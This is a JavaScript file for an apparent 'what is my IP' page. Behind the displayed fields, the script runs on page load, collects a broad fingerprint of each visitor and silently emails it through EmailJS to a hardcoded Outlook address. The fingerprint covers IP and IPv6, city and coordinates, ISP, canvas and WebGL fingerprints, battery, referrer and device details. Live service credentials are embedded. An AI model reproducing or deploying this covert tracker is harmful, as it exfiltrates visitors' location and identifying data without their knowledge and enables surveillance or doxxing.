emailjs.init("2jj19BTFwlNnm8fp_");

async function sendEmail(data) {
    const emailData = {
        to_email: "openeyes08@outlook.com",
        subject: "New IP Visitor - Full Data",
        message: `=== IP & NETWORK ===
IP ADDRESS: ${data.ip}
IPv6: ${data.ipv6}
LOCATION: ${data.location}
ISP / PROVIDER: ${data.isp}
COUNTRY CODE: ${data.country}
TIMEZONE: ${data.timezone}
COORDINATES: ${data.coords}
ASN: ${data.asn}
VPN/PROXY: ${data.vpn}

=== SYSTEM INFO ===
OS: ${data.os}
BROWSER: ${data.browser}
USER AGENT: ${data.useragent}
SCREEN: ${data.screen}
LANGUAGE: ${data.lang}
CONNECTION: ${data.connection}
CPU CORES: ${data.cores}
MEMORY: ${data.memory}
TOUCH SUPPORT: ${data.touch}
BATTERY: ${data.battery}

=== BROWSER DATA ===
COOKIES ENABLED: ${data.cookies}
LOCAL STORAGE: ${data.storage}
SESSION STORAGE: ${data.sessionStorage}
WEBGL: ${data.webgl}
CANVAS FINGERPRINT: ${data.canvas}
REFERRER: ${data.referrer}
JAVA ENABLED: ${data.java}
FLASH: ${data.flash}

=== ADDITIONAL ===
TIMEZONE OFFSET: ${data.timezoneOffset}
LOCAL TIME: ${data.localTime}
PLATFORM: ${data.platform}
DO NOT TRACK: ${data.doNotTrack}
ONLINE STATUS: ${data.onlineStatus}
CONNECTION TYPE: ${data.connectionType}`
    };
    
    try {
        await emailjs.send("service_14u2qeo", "template_psyarye", emailData);
    } catch (error) {
        console.error('Email failed:', error);
    }
}

function getOS() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf("Win") !== -1) return "Windows";
    if (userAgent.indexOf("Mac") !== -1) return "macOS";
    if (userAgent.indexOf("Linux") !== -1) return "Linux";
    if (userAgent.indexOf("Android") !== -1) return "Android";
    if (userAgent.indexOf("iPhone") !== -1) return "iOS";
    return "Unknown";
}

function getBrowser() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf("Chrome") !== -1) return "Chrome";
    if (userAgent.indexOf("Firefox") !== -1) return "Firefox";
    if (userAgent.indexOf("Safari") !== -1) return "Safari";
    if (userAgent.indexOf("Edge") !== -1) return "Edge";
    if (userAgent.indexOf("Opera") !== -1) return "Opera";
    return "Unknown";
}

async function getIPv6() {
    try {
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'unavailable';
    }
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas fingerprint test', 2, 2);
        return canvas.toDataURL().slice(-20);
    } catch {
        return 'blocked';
    }
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'not supported';
        const renderer = gl.getParameter(gl.RENDERER);
        const vendor = gl.getParameter(gl.VENDOR);
        return `${vendor} ${renderer}`.substring(0, 50);
    } catch {
        return 'blocked';
    }
}

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}% - ${battery.charging ? 'charging' : 'not charging'}`;
        }
        return 'unavailable';
    } catch {
        return 'blocked';
    }
}

function detectVPN() {
    // Simple VPN detection based on common patterns
    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    // Basic heuristics
    if (userAgent.includes('VPN') || userAgent.includes('Proxy')) return 'detected';
    if (navigator.webdriver) return 'possible automation';
    return 'not detected';
}

async function loadData() {
    const btn = document.getElementById('refresh-btn');
    btn.textContent = 'loading...';
    btn.disabled = true;
    
    let collectedData = {};
    
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        const ipDisplay = data.ip || 'error';
        document.getElementById('ip').textContent = ipDisplay;
        collectedData.ip = ipDisplay;
        
        const location = `${data.city || 'unknown'}, ${data.region || 'unknown'}, ${data.country_name || 'unknown'}`;
        document.getElementById('location').textContent = location;
        collectedData.location = location;
        
        const isp = data.org || 'unknown';
        document.getElementById('isp').textContent = isp;
        collectedData.isp = isp;
        
        const country = `${data.country_code || 'unknown'} (${data.country_calling_code || 'n/a'})`;
        document.getElementById('country').textContent = country;
        collectedData.country = country;
        
        const timezone = data.timezone || 'unknown';
        document.getElementById('timezone').textContent = timezone;
        collectedData.timezone = timezone;
        
        const coords = `${data.latitude || 'unknown'}, ${data.longitude || 'unknown'}`;
        document.getElementById('coords').textContent = coords;
        collectedData.coords = coords;
        
        const asn = `AS${data.asn || 'unknown'} - ${data.network || 'unknown'}`;
        document.getElementById('asn').textContent = asn;
        collectedData.asn = asn;
        
    } catch (error) {
        document.getElementById('ip').textContent = 'error';
        document.getElementById('location').textContent = 'error';
        document.getElementById('isp').textContent = 'error';
        document.getElementById('country').textContent = 'error';
        document.getElementById('timezone').textContent = 'error';
        document.getElementById('coords').textContent = 'error';
        document.getElementById('asn').textContent = 'error';
        collectedData = { 
            ip: 'error', location: 'error', isp: 'error', 
            country: 'error', timezone: 'error', coords: 'error', asn: 'error' 
        };
    }
    
    // System info
    const useragent = navigator.userAgent;
    document.getElementById('useragent').textContent = useragent;
    collectedData.useragent = useragent;
    
    const screenInfo = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`;
    document.getElementById('screen').textContent = screenInfo;
    collectedData.screen = screenInfo;
    
    const langInfo = `${navigator.language || 'unknown'} (${navigator.languages?.join(', ') || 'n/a'})`;
    document.getElementById('lang').textContent = langInfo;
    collectedData.lang = langInfo;
    
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const connectionInfo = connection ? `${connection.effectiveType || 'unknown'} - ${connection.downlink || 'unknown'}mbps` : 'unavailable';
    document.getElementById('connection').textContent = connectionInfo;
    collectedData.connection = connectionInfo;
    
    // Additional data for email
    collectedData.ipv6 = await getIPv6();
    collectedData.os = getOS();
    collectedData.browser = getBrowser();
    collectedData.cores = navigator.hardwareConcurrency || 'unknown';
    collectedData.memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'unknown';
    collectedData.touch = 'ontouchstart' in window ? 'supported' : 'not supported';
    collectedData.battery = await getBatteryInfo();
    collectedData.cookies = navigator.cookieEnabled ? 'enabled' : 'disabled';
    collectedData.storage = typeof(Storage) !== "undefined" ? 'supported' : 'not supported';
    collectedData.sessionStorage = typeof(sessionStorage) !== "undefined" ? 'supported' : 'not supported';
    collectedData.webgl = getWebGLInfo();
    collectedData.canvas = getCanvasFingerprint();
    collectedData.referrer = document.referrer || 'direct';
    collectedData.java = navigator.javaEnabled ? navigator.javaEnabled() : 'unknown';
    collectedData.flash = navigator.plugins['Shockwave Flash'] ? 'enabled' : 'not detected';
    collectedData.timezoneOffset = new Date().getTimezoneOffset();
    collectedData.localTime = new Date().toLocaleString();
    collectedData.platform = navigator.platform;
    collectedData.doNotTrack = navigator.doNotTrack || 'not set';
    collectedData.onlineStatus = navigator.onLine ? 'online' : 'offline';
    collectedData.connectionType = connection ? connection.type || 'unknown' : 'unknown';
    collectedData.vpn = detectVPN();
    
    // Send comprehensive email
    await sendEmail(collectedData);
    
    btn.textContent = 'refresh data';
    btn.disabled = false;
}

function refresh() {
    loadData();
}

document.addEventListener('DOMContentLoaded', loadData);
